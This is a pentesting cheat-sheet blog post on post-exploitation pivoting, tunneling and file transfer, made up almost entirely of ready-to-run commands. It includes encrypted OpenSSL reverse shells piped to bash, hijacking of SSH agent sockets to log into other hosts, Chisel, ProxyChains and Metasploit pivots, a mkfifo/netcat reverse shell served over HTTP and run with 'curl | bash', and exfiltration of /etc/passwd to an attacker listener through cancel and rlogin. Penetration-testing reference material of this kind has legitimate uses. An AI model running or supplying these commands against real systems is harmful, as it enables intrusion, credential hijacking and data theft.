---
title: Pivoting, tunneling, and sending files
date: 2024-08-03 10:00:00
categories:
  - Pentesting
  - Linux
tags:
  - Pentesting
  - Linux
  - Pivoting
  - Port forwarding
  - Tunneling
  - Send files
toc: true
---

---
Obtain access to other resources on the internal network.
Transfer files in smart ways.

---
<!-- more -->

## Pivoting

### Encrypted shell with OpenSSL
```bash Generate a certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

```bash Start an OpenSSL server
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

```bash Connect from the client
openssl s_client -quiet -connect $IP:4444
```

<br>

### Encrypted reverse shell with OpenSSl
```bash Generate a certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

```bash Set up the listening server
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

```bash Connect to the sever from the client and initiate the shell
openssl s_client -quiet -connect $IP:4444 | bash
```

<br>

### Alternative: separate input and output ports
> Using separate ports for input and output in an encrypted shell can enhance control and clarity. It allows you to monitor and debug each communication stream independently, reduces congestion by handling data in distinct channels, and offers more granular security management. This setup is particularly beneficial in complex environments.

```bash Server 1: Listen on Port 4444 (for sending commands)
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

```bash Server 2: Listen on Port 4445 (for receiving output)
openssl s_server -quiet -key key.pem -cert cert.pem -port 4445
```

```bash Client: Set up a two-way encrypted shell
openssl s_client -quiet -connect <server_ip>:4444 | bash | openssl s_client -quiet -connect <server_ip>:4445
```

<br>

### Hijacking SSH agent connections 
> In SSH, an SSH agent is a program that holds private keys used for authentication. The SSH agent allows users to authenticate to remote servers without re-entering their passphrase for every SSH connection. The agent's socket, typically found in the `/tmp` directory, is used to communicate with the SSH client.

1. Find SSH process
```bash
ps aux | grep ssh
```
2. Locate SSH agent socket
```bash
ls -lah /tmp
```
3. List cached SSH keys
```bash naming pattern like ssh-<random-string>/agent.<pid>, where <pid> is the process ID of the SSH agent
SSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh-add -l
```
4. Hijack the SSH agent
```bash
SSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh user@target
```

<br>

### Metasploit `route`
```bash Add a route manually
msf6 > route add 169.254.0.0 255.255.0.0 1
msf6 > route add 172.19.176.0 255.255.240.0 1
```
```bash Print the routing table
msf6 > route print
```
```bash Get specific route information
msf6 > route get 169.254.204.110
```
```bash Remove a specific route
msf6 > route remove 172.19.176.0/20 1
```

<br>

## Metasploit `autoroute`
```bash Background the current session
meterpreter > background
```
```bash Use the autoroute module
msf6 > use post/multi/manage/autoroute
```
```bash Set the session and subnet
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0
msf6 post(multi/manage/autoroute) > set NETMASK /16
```
```bash Run the module
msf6 post(multi/manage/autoroute) > run
```
```bash Check the routing table
msf6 post(multi/manage/autoroute) > route
```

<br>

## Tunneling (port forwarding)

### SSH
| Argument | Legend | Explanation |
| --- | --- | --- |
| `-L` | `local_port:remote_address:remote_port` | local port forwarding |
| `-R` | `port:local_address:local_port` | remote port forwarding |
| `-D` | `local_port` | dynamic port forwarding - creates a socks proxy on localhost |
| `-N` |  | do not execute a remote command - useful for just forwarding ports |

<br>

### Chisel
> Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance. _(as described by its author)_

Server (attacker machine with IP `10.10.10.20`)
```bash
chisel server -p 8000 --reverse
```
Client (victim machine with IP `10.10.10.10`, another host with IP `10.10.10.30`)
```bash Forward local port 80 from the attacker on port 80 on the victim localhost
./chisel client 10.10.10.20:8000 R:80:127.0.0.1:80
```
```bash Forward local port 4444 from the attacker on port 80 on the remote host 10.10.10.30
./chisel client 10.10.10.20:8000 R:4444:10.10.10.30:80
```
```bash Set up a SOCKS5 proxy on port 1080 on the attacker 
./chisel client 10.10.10.20:8000 R:socks
```

<br>

### ProxyChains (and port scanning)
1. Establish SSH connection with dynamic port forwarding
```bash
ssh -D 1337 user@$IP
```

2. Configure ProxyChains for dynamic port forwarding
```bash
echo "socks5 127.0.0.1 1337" | sudo tee -a /etc/proxychains.conf
# Ensure to comment out any socks4 lines in /etc/proxychains.conf
```

3. Perform port scan through the SSH tunnel
```bash
proxychains nmap -sT 127.0.0.1
```

<br>

### Metasploit
```bash
portfwd add -l 1234 -p 21 -r 10.10.10.20 
portfwd list
```

<br>

## Transfer files

### Host and download reverse shell
On attacker machine
```bash attacker host with IP 10.10.10.20
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.20 9001 >/tmp/f' > rev.sh
python3 -m http.server 80
```
Download and run reverse shell
```bash Method 1
curl http://10.10.10.20/rev.sh | bash &
```
```bash Method 2
curl http://10.10.10.20/rev.sh -o /dev/shm/rev.sh; chmod +x /dev/shm/rev.sh
/dev/shm/rev.sh
```

<br>

### Encrypt data in transit
```bash Encrypt
openssl enc -aes-256-cbc -pbkdf2 -k strongPass < input.txt > input.txt.enc
```
```bash Decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -k strongPass < input.txt.enc > input.txt
```

<br>

### Exfiltraion with `cancel` and `rlogin`
> **`cancel`**: A command typically used to cancel print jobs, but it can also be misused for transferring data if it sends data to a networked print server.
> **`rlogin`**: A remote login program that can be used to connect to another machine over the network. It can also be used to send data if itâ€™s misconfigured or used in an unconventional way.

Set up a listener (attacker machine)
```bash
nc -lvnp 443
```
Send data
```bash cancel
cancel -u "$(cat /etc/passwd | base64)" -h $IP:443
```
```bash rlogin
rlogin -l "$(cat /etc/passwd | base64)" -p 443 $IP
```

<br>

### Send and request data with `curl`
```bash
curl -X PUT http://10.10.10.10/file.bin --data-binary @filename.bin

curl -X MOVE -H 'Destination: http://10.10.10.10/filename.bin' http://10.10.10.10/file.bin 
```

<br>

---
---